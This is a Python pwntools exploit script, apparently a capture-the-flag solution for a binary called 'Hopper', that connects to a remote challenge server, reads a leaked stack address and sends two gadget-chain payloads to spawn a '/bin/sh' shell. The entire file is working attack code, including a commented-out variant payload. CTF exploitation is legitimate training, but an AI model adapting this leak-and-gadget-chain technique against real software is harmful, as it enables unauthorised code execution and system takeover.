from pwn import *
from icecream import ic

elf = exe = ELF("./Hopper")

context.binary = exe
context.log_level = "debug"
context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("pwn.1nf1n1ty.team", 31886)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x0000000000401033
b *0x401079
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def gad(a, b): return ROP(a).find_gadget([f"pop {b}", "ret"])[0]
def i(): return io.interactive()

io = start()

ru(")")
rl()
leak = u64(re(8))
ic(hex(leak))



payload = p64(0x40101a)
payload += p64(0x0000000000401069)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += b'/bin/sh\x00'

s(payload)

payload = p64(0x0000000000401017)
payload += p64(leak+0x10+0x28)
payload += p64(leak+0x8)
payload += p64(0x0000000000401027)
payload += p64(0x0000000000401011)
payload += p64(0x0000000000401021)
payload += p64(0x401077)
payload += b'/sh'
s(payload)

# payload = p64(0x0000000000401017)
# payload += p64(leak+0x10)
# payload += p64(leak+0x8+0x10)
# payload += (b'/bin/sh\x00')
# payload += p64(0x0000000000401011)
# payload += p64(0x0000000000401021)
# payload += p64(0x401077)
# payload += b'/sh'
# s(payload)
io.interactive()
